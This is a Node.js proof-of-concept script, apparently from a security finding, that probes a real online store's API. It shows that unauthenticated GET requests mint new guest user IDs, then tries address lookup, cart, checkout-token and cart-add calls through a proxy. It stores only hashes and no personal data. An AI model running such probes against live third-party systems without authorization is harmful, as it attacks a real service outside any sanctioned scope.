// 42 - Unauthenticated store guest identity creation on a GET.
//
// GET /mall-userms/user/ms/user/info with an arbitrary x-bbl-account-access
// returns code 1 and a new 18-digit guest userId on each call. No auth; no
// stable identity. The same header value (DEFAULT_C) produced different userIds.
//
// This harness records status/code and SHA-256 prefixes only; no PII values.
//
// Run: node run.js

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { ProxyAgent, fetch } = require('undici');

const API = process.env.STORE_API || 'https://na-store-api.bambulab.com';
const STORE = process.env.STORE_ORIGIN || 'https://us.store.bambulab.com';
const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || 'http://127.0.0.1:7890';
const dispatcher = new ProxyAgent(proxy);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36';

async function req(path, method = 'GET', body, access = 'DEFAULT_C') {
  try {
    const r = await fetch(API + path, {
      method,
      headers: { origin: STORE, referer: STORE + '/', 'user-agent': UA, 'content-type': 'application/json', 'x-bbl-account-access': access },
      body: body ? JSON.stringify(body) : undefined,
      dispatcher,
      signal: AbortSignal.timeout(20000),
    });
    const t = await r.text();
    let j; try { j = JSON.parse(t); } catch { j = {}; }
    return { status: r.status, j };
  } catch (e) { return { status: 'ERR', j: { message: e.name } }; }
}

function h(v) { return crypto.createHash('sha256').update(String(v)).digest('hex').slice(0, 12); }

(async () => {
  const results = {
    api: API,
    timestamp: new Date().toISOString(),
    hypothesis: 'GET /mall-userms/user/ms/user/info creates a new guest userId on every call with no auth.',
    calls: [],
    address: null,
    cart: null,
    checkoutToken: null,
    cartAdd: null,
    summary: {},
  };

  for (let i = 1; i <= 3; i++) {
    const r = await req('/mall-userms/user/ms/user/info', 'GET', undefined, 'DEFAULT_C');
    const p = r.j.data || {};
    results.calls.push({
      call: i,
      status: r.status,
      code: r.j.code,
      userIdLen: String(p.userId || '').length,
      userIdHash: p.userId ? h(p.userId) : '',
      userNameLen: String(p.userName || '').length,
      emailMarketType: typeof p.emailMarket,
      companyLen: String(p.companyName || '').length,
      partnerKeys: p.partnerInfo && typeof p.partnerInfo === 'object' ? Object.keys(p.partnerInfo).length : 0,
    });
    console.log('INFO', i, JSON.stringify(results.calls[i - 1]));
  }

  const a = await req('/mall-userms/user/shippingAddress/queryList');
  results.address = { status: a.status, code: a.j.code, message: a.j.message, dataType: Array.isArray(a.j.data) ? 'array:' + a.j.data.length : typeof a.j.data };
  const c = await req('/mall-order/v1/cart/size');
  results.cart = { status: c.status, code: c.j.code, cartSize: c.j.data && typeof c.j.data === 'object' ? c.j.data.cartSize : typeof c.j.data };
  const t = await req('/mall-order/v1/checkout/token/create', 'POST', {});
  results.checkoutToken = { status: t.status, code: t.j.code, message: t.j.message, tokenPresent: !!(t.j.data && t.j.data.token) };
  const add = await req('/mall-order/v1/cart/add', 'POST', { addSku: [{ quantity: 1, productSkuId: '1', productId: '1' }], giftList: [], pageType: 1 });
  results.cartAdd = { status: add.status, code: add.j.code, message: add.j.message };

  results.summary = {
    distinctGuestIds: new Set(results.calls.map((c) => c.userIdHash)).size,
    calls: results.calls.length,
    address: results.address.code + '/' + results.address.message,
    cartSize: results.cart.cartSize,
    checkoutTokenPresent: results.checkoutToken.tokenPresent,
    cartAdd: results.cartAdd.code + '/' + results.cartAdd.message,
  };
  console.log('SUMMARY', JSON.stringify(results.summary));

  fs.writeFileSync(path.join(__dirname, 'results.json'), JSON.stringify(results, null, 2));
  fs.writeFileSync(
    path.join(__dirname, 'results.txt'),
    [
      ...results.calls.map((c) => `INFO ${c.call} status=${c.status} code=${c.code} userIdLen=${c.userIdLen} userIdHash=${c.userIdHash}`),
      'ADDRESS ' + JSON.stringify(results.address),
      'CART ' + JSON.stringify(results.cart),
      'TOKEN ' + JSON.stringify(results.checkoutToken),
      'ADD ' + JSON.stringify(results.cartAdd),
      'SUMMARY ' + JSON.stringify(results.summary),
    ].join('\n') + '\n'
  );
  process.exit(0);
})();
